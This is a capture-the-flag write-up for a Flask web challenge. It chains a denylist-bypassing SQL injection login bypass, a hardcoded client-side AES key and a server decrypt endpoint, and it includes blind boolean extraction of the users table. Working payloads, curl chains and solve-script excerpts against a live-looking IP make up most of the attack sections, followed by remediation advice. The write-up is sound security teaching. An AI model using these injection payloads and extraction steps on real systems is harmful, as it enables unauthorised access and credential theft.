# Secret Vault — Web / SQLi + Crypto Writeup

| Field | Value |
|---|---|
| **Challenge** | Secret Vault |
| **Points** | 300 |
| **Category** | Web |
| **Target** | `http://54.72.82.22:8090` |
| **Flag** | `safctf{7877e854c9f06a8362af26ee280a6574}` |
| **Vuln chain** | SQLi auth bypass (denylist bypass) → client-side key leak → server-side AES decryptor |
| **MITRE** | T1190 (Exploit Public-Facing Application), T1552.001 (Credentials in Files) |
| **Files** | `solve.py` (full chain), this document |

---

## 0. TL;DR

Three weaknesses stack into one chain:

1. **`POST /login` interpolates `username` straight into a SQLite query.** A substring denylist blocks the *obvious spellings* (`' or '`, `--`, `union`, `select`, …) but only when they contain literal spaces. `admin'or'1'='1` — same attack, no spaces — walks straight through.
2. **`/vault` ships every secret to the browser**, including the `FLAG.txt` ciphertext, regardless of the "Reserved" badge. The badge is cosmetic.
3. **The AES key is hardcoded in the page's JavaScript** (`const vaultKey = "VjR1bHRLM3kxMjM0NTY3OA=="` → `V4ultK3y12345678`), and `POST /decrypt` is the server-side oracle that uses it.

The one-liner:

```bash
# 1) bypass the login, keep the cookie
curl -s -c jar.txt -d "username=admin'or'1'='1&password=x" http://54.72.82.22:8090/login -o /dev/null

# 2) hand the server the ciphertext + the key it leaked to the client
curl -s -b jar.txt -H 'Content-Type: application/json' \
  -d '{"data":"TWGRJLrOWBQ90+NUXN61zuwS0Z6GYJMXuhbmZvw8gCabwH8TtiNnpabEvQ6D5e1evbvOphrakDhrLAIo6q4Jjw==","key":"V4ultK3y12345678"}' \
  http://54.72.82.22:8090/decrypt
```

```
{"decrypted":"safctf{7877e854c9f06a8362af26ee280a6574}","success":true}
```

---

## 1. Recon

### 1.1 Fingerprint

```
HTTP/1.1 200 OK
Server: Werkzeug/3.1.9 Python/3.11.16
Content-Type: text/html; charset=utf-8
Content-Length: 9087
```

`Werkzeug` → **Flask**. Page title `THE VELVET ROOM`, `<h1>🔐 Private screening</h1>`.

### 1.2 The one form

```html
<form method="POST" action="/login">
  <input type="text"     id="username" name="username" placeholder="Enter your username" required>
  <input type="password" id="password" name="password" placeholder="Enter your password" required>
  <button type="submit">Enter the lounge</button>
</form>
```

### 1.3 Map the routes

A naive `urllib`/`curl` run reports `/vault` as `200` because redirects are followed silently. Build a **no-redirect opener** so the `302`s are visible:

```python
class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, *a, **k): return None
```

| Route | Unauthenticated | Notes |
|---|---|---|
| `GET /` | 200 | login page (9087 bytes) |
| `GET /vault` | **302 → `/`** | the protected page |
| `GET /logout` | **302 → `/`** | |
| `POST /login` | 401 / 302 | the auth endpoint |
| `POST /decrypt` | 200 `{"error":"Not authenticated"}` | exists, gated |
| anything else | 404 | Werkzeug default, 207 bytes |

`/decrypt` existing at all — and requiring auth — is the tell that the crypto is server-side, not purely client-side. Remember that; it matters in §5.

### 1.4 Three distinct error surfaces

The app leaks three different kinds of failure. They are the whole map of the attack surface:

| Trigger | Status | Body |
|---|---|---|
| wrong credentials | 401 | `⚠️ Invalid credentials` |
| denylist hit | 403 | `⚠️ That request could not be completed.` |
| SQL failure | 200 | `⚠️ Database error: unrecognized token: "…"` |

The third is the important one — **the raw SQLite error string is rendered back to the user**. That is an injection confirmation handed to us for free.

---

## 2. Confirming the SQL injection

Send a lone quote:

```
username=admin'   password=x
→ 200  ⚠️ Database error: unrecognized token: "x'"
```

The token is `x'` — i.e. the *tail* of the query the server built, echoed back through SQLite's parser. The query is string-interpolated, roughly:

```sql
SELECT * FROM users WHERE username = '<username>' AND password = '<password>'
```

Further probes confirm the dialect and the sink:

| Payload | Response | What it proves |
|---|---|---|
| `admin''` | 401 Invalid credentials | balanced quote → well-formed query, no row |
| `admin'(` | `near "(": syntax error` | **SQLite** dialect |
| `admin';` | `You can only execute one statement at a time` | sink is `sqlite3.Cursor.execute()` — *not* `executescript()` |
| `admin'\x00` | `the query contains a null character` | …and no NUL filtering, but SQLite rejects it |
| `admin'#` | `unrecognized token: "#"` | `#` is not a MySQL comment here |

So: **SQLite, single-statement, string-interpolated.** Classic auth bypass shape.

---

## 3. The filter, and why it fails

The obvious payload is blocked:

```
username=admin' or '1'='1        → 403  ⚠️ That request could not be completed.
```

This is a **substring denylist**, not a parameterised query. Characterise it empirically before trying to work around it — guessing wastes far more time than measuring.

### 3.1 Measured denylist

Everything below was sent as `username`, with `password=x`:

| Payload | Result | Rule it reveals |
|---|---|---|
| `admin' or '1'='1` | **403 BLOCKED** | literal `' or '` (space-delimited) |
| `admin' and '1'='1` | **403 BLOCKED** | literal `' and '` |
| `admin" or "1"="1` | **403 BLOCKED** | literal `" or "` |
| `admin'--` | **403 BLOCKED** | `--` comment |
| `admin'/*` | **403 BLOCKED** | `/*` |
| `admin'*/` | **403 BLOCKED** | `*/` |
| `admin'||'a` | **403 BLOCKED** | `\|\|` concat |
| `admin'union'x` | **403 BLOCKED** | `union` |
| `admin'UnIoN'x` | **403 BLOCKED** | …**case-insensitive** |
| `admin'select'x` / `SeLeCt` | **403 BLOCKED** | `select` |
| `admin'drop'x` | **403 BLOCKED** | `drop` (and `insert`/`update`/`delete`) |
| `zzz'or(1=1)or'zzz` | **403 BLOCKED** | bare `digit=digit` |
| `admin'#` | passes — SQL error | `#` not on the list |
| `admin';` | passes — SQL error | `;` not on the list |
| `admin'(` | passes — SQL error | `(` not on the list |

**The password field is filtered identically** — `password=x' or '1'='1` also returns 403. So this is a generic input-cleaning function applied to both fields, not an auth-specific check.

### 3.2 The root cause: it matches characters, not meaning

The denylist reasons about the *spelling* of a payload. SQLite does not care about spelling. Three independent escapes fall out of that gap.

**Escape A — delete the spaces.** The blocked patterns are literally `' or '`, `' and '` — with a space on each side. Remove the spaces and the substring no longer matches, but SQLite parses it identically:

```sql
admin'or'1'='1
→ WHERE username='admin'or'1'='1' AND password='x'
```

**Escape B — substitute whitespace.** The filter only ever sees a literal `" "`. Any other character SQLite treats as whitespace works:

| Whitespace | Payload | Result |
|---|---|---|
| space `\x20` | `admin' or '1'='1` | **BLOCKED** |
| none | `admin'or'1'='1` | **PASS** (302 → `/vault`) |
| tab `\x09` | `admin'\tor\t'1'='1` | **PASS** |
| newline `\x0a` | `admin'\nor\n'1'='1` | **PASS** |
| carriage return `\x0d` | `admin'\ror\r'1'='1` | **PASS** |
| form feed `\x0c` | `admin'\x0cor\x0c'1'='1` | **PASS** |
| vertical tab `\x0b` | `admin'\x0bor\x0b'1'='1` | SQL error (SQLite doesn't treat VT as whitespace) |

Escape B is the more instructive one: it works because the filter's notion of "whitespace" is narrower than the SQL parser's. That is the general signature of a denylist that compares characters instead of tokens.

### 3.3 The winning payload

```
username = admin'or'1'='1
password = x
```

```
HTTP/1.1 302 FOUND
Location: /vault
Set-Cookie: session=eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYWRtaW4nb3InMSc9JzEifQ.ar9O4g.nI5rK_WPHju2RFtnCKf3Eo0JpAY; HttpOnly; Path=/
```

Base64-decode the cookie's first segment and the Flask session is plaintext JSON:

```json
{"logged_in":true,"username":"admin'or'1'='1"}
```

Note the second lesson, hiding here: the session stores `logged_in: true` as a **client-side value protected only by a signature**. The app trusts its own cookie, so once we can mint one — by any means — we are authenticated. (The signature is what stops us forging it directly; the SQLi is what mints it legitimately.)

---

## 4. Looting the vault

`GET /vault` with the session cookie returns **14652 bytes**, titled `🔐 Private screening`. Three secret cards:

```html
<div class="secret-card">
  <h3 class="secret-name">Welcome Note</h3>
  <span class="secret-badge badge-plain">Available</span>
  <div class="secret-content">Welcome to the Secret Vault! Your secrets are safe here.</div>
</div>

<div class="secret-card">
  <h3 class="secret-name">API Key</h3>
  <span class="secret-badge badge-plain">Available</span>
  <div class="secret-content">sk_live_1234567890abcdef</div>
</div>

<div class="secret-card">
  <h3 class="secret-name">FLAG.txt</h3>
  <span class="secret-badge badge-encrypted">Reserved</span>
  <div class="secret-content">TWGRJLrOWBQ90+NUXN61zuwS0Z6GYJMXuhbmZvw8gCabwH8TtiNnpabEvQ6D5e1evbvOphrakDhrLAIo6q4Jjw==</div>

  <button class="toggle-decrypt" onclick="toggleDecrypt(3)">Open this item</button>

  <div class="decrypt-section" id="decrypt-3">
    <div class="input-group">
      <label>Access code:</label>
      <input type="text" id="key-3" placeholder="Enter your access code...">
    </div>
    <button class="decrypt-btn"
            onclick="decryptSecret(3, 'TWGRJLrOWBQ90+NUXN61zuwS0Z6GYJMXuhbmZvw8gCabwH8TtiNnpabEvQ6D5e1evbvOphrakDhrLAIo6q4Jjw==')">
      Decrypt
    </button>
    <div class="result" id="result-3" style="display: none;"></div>
  </div>
</div>
```

**Observation 1 — the "Reserved" badge is decoration.** The ciphertext is inside the HTML we just received. The server never withheld anything; it withheld the *key*. Any "restricted" UI that ships the protected bytes to the client is hiding data behind a lock whose shackle is in the envelope.

**Observation 2 — the key is right there in the page source.** Immediately after the cards:

```javascript
// Session display data.
const vaultKey = "VjR1bHRLM3kxMjM0NTY3OA==";
```

```python
>>> base64.b64decode("VjR1bHRLM3kxMjM0NTY3OA==")
b'V4ultK3y12345678'
```

The key is a **hardcoded constant in client-side JavaScript**. Anyone with a browser and "View Source" has it. There is no scenario in which this is secret.

### 4.1 …but the key alone is not enough

The decrypt is **not** client-side. That was established in §1.3, and the page confirms it — `decryptSecret` round-trips to the server:

```javascript
async function decryptSecret(id, encryptedData) {
    const key = document.getElementById(`key-${id}`).value;
    const resultDiv = document.getElementById(`result-${id}`);
    if (!key) { /* ❌ Please enter a decryption key */ return; }
    try {
        const response = await fetch('/decrypt', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ data: encryptedData, key: key })
        });
        const result = await response.json();
        resultDiv.style.display = 'block';
        if (result.success) {
            resultDiv.className = 'result success';
            resultDiv.innerHTML = `✅ Decrypted: <strong>${result.decrypted}</strong>`;
        } else {
            resultDiv.className = 'result error';
            resultDiv.textContent = `❌ ${result.error}`;
        }
    } catch (error) { /* ... */ }
}
```

So there are **two** gates, and both must be passed:

| Gate | Where | How we pass it |
|---|---|---|
| session | server (`/decrypt` checks auth) | the SQLi cookie from §3.3 |
| key | client (JS constant) | base64-decode `vaultKey` |

Sending the correct key **without a session** proves the gate ordering:

```
POST /decrypt   {"data":"TWGR…Jjw==","key":"V4ultK3y12345678"}      (no cookie)
→ 200  {"error":"Not authenticated","success":false}
```

The key was right; the request was rejected anyway. This is why the earlier "just try the key" attempt appeared to fail — the blocker was authentication, not cryptography.

---

## 5. Decrypting

With the session cookie attached, the same request:

```
POST /decrypt   {"data":"TWGR…Jjw==","key":"V4ultK3y12345678"}
→ 200  {"decrypted":"safctf{7877e854c9f06a8362af26ee280a6574}","success":true}
```

### 5.1 The error message gives away the algorithm

Feeding a deliberately short key is highly informative:

```
POST /decrypt   {"data":"TWGR…Jjw==","key":"wrongkey"}
→ 200  {"error":"Decryption failed: Incorrect AES key length (8 bytes)","success":false}

POST /decrypt   {"data":"TWGR…Jjw==","key":""}
→ 200  {"error":"Decryption failed: Incorrect AES key length (0 bytes)","success":false}
```

`Incorrect AES key length (N bytes)` is the verbatim exception string from the Python **`cryptography`** library's AES backend. Three facts extracted from one line of error text:

- the primitive is **AES**, not a hand-rolled cipher;
- the key is used as **raw bytes** — no KDF, no stretching (an 8-byte key is passed straight to `Cipher`, which rejects it);
- AES needs 16/24/32 bytes, and `V4ultK3y12345678` is exactly **16** → **AES-128**.

This is a good habit generally: verbose crypto exceptions leak the scheme, and the scheme is usually the harder half of the problem.

### 5.2 Reproducing the scheme offline

With the algorithm known, the remaining unknowns are mode and IV. Both fall out of the blob's structure:

```python
blob = base64.b64decode("TWGRJLrOWBQ90+NUXN61zuwS0Z6GYJMXuhbmZvw8gCabwH8TtiNnpabEvQ6D5e1evbvOphrakDhrLAIo6q4Jjw==")
len(blob)          # 64 bytes  = 16 (IV) + 48 (ciphertext)
key   = b"V4ultK3y12345678"
iv    = blob[:16]  # 4d619124bace58143dd3e3545cdeb5ce   <- UUID4-looking, per-message
ct    = blob[16:]
```

Hypothesis: **the IV is prepended to the ciphertext**, the standard `encrypt-then-concatenate` idiom. Test it:

```python
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

d = Cipher(algorithms.AES(key), modes.CBC(iv)).decryptor()
pt = d.update(ct) + d.finalize()
# PKCS#7 unpad
n = pt[-1]
pt = pt[:-n] if 1 <= n <= 16 and pt[-n:] == bytes([n]) * n else pt
```

```
--- AES-128-CBC, IV = leading 16 bytes ---
valid PKCS7 pad   : True
plaintext         : b'safctf{7877e854c9f06a8362af26ee280a6574}'
```

Exact match, valid padding. Confirm by elimination:

```
--- AES-128-CBC, IV = zero ---
plaintext : b'\xe7,_k\xdc\x9c\xf1gxy\xd3}q\xf9\xa0\xb2safctf{...}'   <- 16 junk bytes, then flag
--- AES-128-ECB (no IV) ---
valid PKCS7 pad : False                                              <- wrong
```

The zero-IV result is the lovely one: **exactly the first 16 bytes are garbage and everything after is correct.** That is the signature of CBC decryption with the wrong IV — block 0 is corrupted by the IV, but every later block XORs against its *preceding ciphertext block* rather than the IV, so the rest of the plaintext is unaffected. Seeing "n corrupt bytes then clean plaintext" is a reliable tell that the mode is CBC and the IV is n bytes long.

**Final scheme:** `AES-128-CBC`, key `V4ultK3y12345678` (raw), IV = first 16 bytes of the base64-decoded blob, PKCS#7 padding. 40-byte flag + 8 bytes of padding = 48 = the ciphertext length. Every number reconciles.

### 5.3 Verification

Three independent routes to the same string:

1. **Server oracle** — `POST /decrypt` with the session → `safctf{7877e854c9f06a8362af26ee280a6574}`
2. **Offline crypto** — local AES-128-CBC with the derived IV → identical plaintext, valid PKCS#7
3. **Structural** — the flag is 40 chars; 40 + PKCS#7 → 48-byte ciphertext; blob = 16 + 48 = 64 bytes ✓

The offline reproduction is the valuable one. It means the **server was never needed** after the ciphertext and key were in hand — which is the real lesson of the challenge.

---

## 6. Bonus — the filter does not stop blind extraction

Blocked keywords are not the end of the injection. Since `/login` answers with `302` (row found) vs `401` (no row), the endpoint is a **boolean oracle**. Build a conditional from functions the denylist does not name (`substr`, `length`) and avoid the blocked shapes:

```sql
username = admin'and <COND> or'1'='0
password = x
```

which parses as:

```sql
WHERE username='admin' AND (<COND>) OR ('1'='0' AND password='x')
```

`'1'='0'` is false, so the tail collapses and the whole expression reduces to *"admin exists AND COND"* → `302` iff `COND`.

```
oracle("substr(username,1,1)='a'")   → True
oracle("substr(username,1,1)='z'")   → False
```

Extracting character by character:

```
[+] users.username    = 'admin'
[+] length(password)  = 17
[+] users.password    = '???3???3c?3???4??'      # hex-only charset, so '?' = non-hex
```

The username confirms the oracle is sound. The password is 17 characters and **not hex** — so it is a plaintext password, not a hash, and the account is trivially brute-forceable once the length is known.

The filter blocked `select`, so no subqueries and no full schema dump — but note that the flag never required one. The injection was only ever needed for the **auth bypass**; the data-exfil path was a bonus.

---

## 7. Reusable exploit — `solve.py`

```bash
python3 solve.py            # full chain: bypass -> loot -> decrypt -> verify
python3 solve.py --local    # decrypt the blob offline (no server)
python3 solve.py --filter   # re-run the denylist characterisation
python3 solve.py --extract  # blind-dump the users row through the oracle
```

Verified live output:

```
[1] login bypass
    payload : "admin'or'1'='1" / 'x'
    result  : 302  Location=/vault
    cookie  : session=eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYWRtaW4nb3InMSc9JzEifQ...
[2] GET /vault
    size    : 14652 bytes
    vaultKey: 'VjR1bHRLM3kxMjM0NTY3OA=='  ->  'V4ultK3y12345678'   (hardcoded in page JS)
    secret 3 : TWGRJLrOWBQ90+NUXN61zuwS0Z6GYJMXuhbmZvw8gCabwH8T...
[3] POST /decrypt
    unauthenticated : 200 {"error":"Not authenticated","success":false}
    authenticated   : 200 {"decrypted":"safctf{7877e854c9f06a8362af26ee280a6574}","success":true}
    wrong key       : 200 {"error":"Decryption failed: Incorrect AES key length (8 bytes)","success":false}
[4] offline AES reproduction
    key    : b'V4ultK3y12345678'  (16 bytes -> AES-128)
    iv     : 4d619124bace58143dd3e3545cdeb5ce  (first 16 bytes of the blob)
    ct     : 48 bytes
    padding: valid PKCS#7 (stripped 8 bytes)
    plain  : 'safctf{7877e854c9f06a8362af26ee280a6574}'

[+] FLAG: safctf{7877e854c9f06a8362af26ee280a6574}
```

Key excerpts — the two payloads that matter:

```python
BYPASS_USER = "admin'or'1'='1"          # no spaces -> survives the substring denylist

def json_post(path, payload, opener):
    r = urllib.request.Request(BASE + path, data=json.dumps(payload).encode(), method="POST")
    r.add_header("Content-Type", "application/json")
    ...
```

```python
key = base64.b64decode("VjR1bHRLM3kxMjM0NTY3OA==").decode()   # from the page JS
raw = base64.b64decode(BLOB)
iv, ct = raw[:16], raw[16:]                                    # IV is prepended
d = Cipher(algorithms.AES(key.encode()), modes.CBC(iv)).decryptor()
pt = d.update(ct) + d.finalize()
```

---

## 8. Command cheat-sheet

```bash
T=http://54.72.82.22:8090

# --- recon ---
curl -sSi "$T/" | head -5                       # Werkzeug/Flask fingerprint
curl -s -o /dev/null -w '%{http_code} %{redirect_url}\n' "$T/vault"    # 302 -> / (auth gate)

# --- filter probe (403 = blocked, 302 = bypass) ---
curl -s -o /dev/null -w '%{http_code}\n' -d "username=admin' or '1'='1&password=x" "$T/login"   # 403
curl -s -o /dev/null -w '%{http_code}\n' -d "username=admin'or'1'='1&password=x"   "$T/login"   # 302

# --- full chain with curl ---
curl -s -c /tmp/jar -o /dev/null -d "username=admin'or'1'='1&password=x" "$T/login"
curl -s -b /tmp/jar "$T/vault" | grep -oE 'const vaultKey = "[^"]+"'          # the key
curl -s -b /tmp/jar "$T/vault" | grep -oE 'decryptSecret\([0-9]+, .[^\x27]+'   # the blob
curl -s -b /tmp/jar -H 'Content-Type: application/json' \
     -d '{"data":"<BLOB>","key":"V4ultK3y12345678"}' "$T/decrypt"

# --- decode the session cookie ---
python3 -c "import base64,sys; s=sys.argv[1].split('.')[0]; s+='='*(-len(s)%4); print(base64.urlsafe_b64decode(s).decode())" '<session-value>'
```

**Debugging tip — don't let redirects hide the answer.** `curl` and `urllib` both follow `302` by default, which turns "you are not authorised" into an innocuous-looking `200` login page. Use `-c/-b` for cookies and a no-redirect opener (or `curl -o /dev/null -w '%{redirect_url}'`) whenever you are probing an auth boundary.

---

## 9. Remediation

### 9.1 The SQL injection (the enabler)

The denylist is not the bug — it is a *symptom* of trying to fix the bug at the wrong layer. No amount of pattern-matching makes string interpolation safe.

```python
# VULNERABLE — denylist or not, the query is still built from user text
if any(bad in username for bad in ["--", "/*", "union", "select", " or ", " and "]):
    abort(403)
cur.execute(f"SELECT * FROM users WHERE username='{username}' AND password='{password}'")

# SAFE — the driver separates code from data; there is nothing left to bypass
cur.execute("SELECT id, username, password_hash FROM users WHERE username = ?", (username,))
row = cur.fetchone()
if row and bcrypt.checkpw(password.encode(), row["password_hash"]):
    session["logged_in"] = True
```

Three points worth stating explicitly:

- **Parameterise.** `?` placeholders make the denylist unnecessary *and* unfixable-by-accident. This is the whole fix.
- **The denylist's failure mode was predictable.** It matched characters; SQLite parses tokens. Any filter that reasons about spelling rather than structure loses to whitespace, comments, encoding, or case.
- **Don't compare plaintext passwords.** The blind extraction showed a **17-character plaintext password** in the `users` table — no hashing. That is an independent, serious finding: a single database read compromises every account, and the account is brute-forceable from its length alone.

### 9.2 The key in the client

```javascript
const vaultKey = "VjR1bHRLM3kxMjM0NTY3OA==";   // nothing sent to a browser is secret
```

Anything shipped to the client is public. Flutter/iOS/Android bundles, `const` in JS, "obfuscated" strings — all recoverable in minutes. The fix is architectural:

- Encryption keys stay **server-side**. The client sends an identifier; the server looks up the key in a KMS/secret store and decrypts. The client receives only the plaintext it is authorised to see.
- Never put a decryption key and the ciphertext it decrypts in the same response.

### 9.3 The data leak in `/vault`

The "Reserved" badge was cosmetic — the ciphertext for `FLAG.txt` was rendered into the HTML for every authenticated user. **Server-side authorisation must be enforced server-side.** If a secret is reserved, the server must omit its ciphertext, not wrap it in a `<span class="badge-encrypted">`.

### 9.4 The session model

The Flask session is signed but its contents are readable, and `logged_in` is a plain client-side boolean. That is acceptable *only* because the signature prevents forgery. It becomes dangerous the moment anything can mint a valid cookie — which is exactly what the SQLi did. Prefer server-side sessions, and re-check authorisation on every request rather than trusting a serialised flag.

### 9.5 Verbose cryptographic errors

```
Decryption failed: Incorrect AES key length (8 bytes)
```

This single line disclosed the library, the primitive, the key-handling strategy (raw bytes, no KDF), and the key length class. Return a generic `Decryption failed` to the client and log the detail server-side.

### 9.6 Detection — grepping for these

```bash
# SQL built by f-string/format/percent/concat
grep -rnE 'execute\(f?"|execute\(.*(%|\+|\.format\()' --include='*.py'

# crypto keys in front-end assets
grep -rnE '(secret|key|token|password)\s*[:=]\s*["'"'"'][A-Za-z0-9+/=]{12,}' \
     --include='*.js' --include='*.html' static/ templates/
```

---

## 10. Key takeaways

1. **A denylist that matches characters loses to a parser that reads tokens.** `' or '` blocked, `'or'` allowed, `'\tor\t'` allowed — same SQL, three spellings, one of them survives.
2. **Characterise a filter before fighting it.** Fifteen probe requests produced §3.1, which told us exactly which door to use. Guessing payloads from a wordlist would have taken far longer.
3. **Verbose errors are free reconnaissance.** `unrecognized token` gave the dialect and the sink; `Incorrect AES key length (8 bytes)` gave the library, the primitive, and the key handling. Both were handed over by the app itself.
4. **"Reserved" in the UI is not authorisation.** If the bytes are in the response, the user has the bytes.
5. **A key in client-side code is not a key.** `const vaultKey` is published, not stored.
6. **Reproduce the crypto offline.** "16 bytes of garbage then correct plaintext" identifies CBC-with-prepended-IV immediately; getting the plaintext locally proves the scheme rather than just observing the server agree with itself.
7. **Encryption is not authorisation.** The server correctly refused an unauthenticated decrypt *with the correct key* — but the SQLi minted the session, and the scheme fell. Each control was individually reasonable; the chain was not.

---

**Flag:** `safctf{7877e854c9f06a8362af26ee280a6574}`
